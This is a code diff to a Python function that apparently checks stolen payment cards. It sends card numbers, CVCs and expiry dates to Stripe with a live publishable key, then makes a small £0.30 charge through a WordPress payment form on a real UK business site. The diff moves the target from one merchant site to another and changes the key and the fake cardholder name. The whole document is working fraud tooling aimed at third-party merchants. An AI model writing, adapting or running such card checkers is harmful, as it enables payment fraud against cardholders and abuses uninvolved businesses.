@@ -29,19 +29,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&billing_details[name]=Oooo&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA=number&payment_user_agent=stripe.js%2Fc59f9dfd6e%3B+stripe-js-v3%2Fc59f9dfd6e%3B+card-element&key=pk_live_51MnlD9BLnG0DgrS7dg4xwTw7EJPH5l3oBUk9sVl3x7MFDTVXdayD9ilvN72iuWvfOhzzJbpP2xZ4ZMMj8UvMoZpV00ndaL2EFc'
+	data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Feeaff566a9%3B+stripe-js-v3%2Feeaff566a9%3B+card-element&key=pk_live_51OYXFULO4BFQIVS8A1MHvzEgvXqMyIjsIBrenSqSW5OdwWuP8IgL7PipGs5z1EXZME1SWUtuR5z7aruBJKIynEXi00cnAXc7yM'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'benidormtransfers.co.uk',
+	    'authority': 'rrssameday.co.uk',
 	    'accept': 'application/json, text/javascript, */*; q=0.01',
 	    'accept-language': 'en-US,en;q=0.9',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://benidormtransfers.co.uk',
-	    'referer': 'https://benidormtransfers.co.uk/payments/',
+	    'origin': 'https://rrssameday.co.uk',
+	    'referer': 'https://rrssameday.co.uk/payments/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -57,13 +57,13 @@ def Tele(ccx):
 	    'wpfs-form-name': 'MakeAPayment',
 	    'wpfs-form-get-parameters': '%7B%7D',
 	    'wpfs-custom-amount-unique': '0.30',
-	    'wpfs-custom-input[]': '09676137398',
-	    'wpfs-card-holder-email': f'Oooo{random_amount1}{random_amount2}@gmail.com',
-	    'wpfs-card-holder-name': 'Oooo',
+	    'wpfs-custom-input[]': 'Waiyan',
+	    'wpfs-card-holder-email': f'Waiyan{random_amount1}{random_amount2}@gmail.com',
+	    'wpfs-card-holder-name': 'Waiyan',
 	    'wpfs-stripe-payment-method-id': f'{pm}',
 	}
 	
-	response = requests.post('https://benidormtransfers.co.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post('https://rrssameday.co.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	result = response.json()['message']
 	
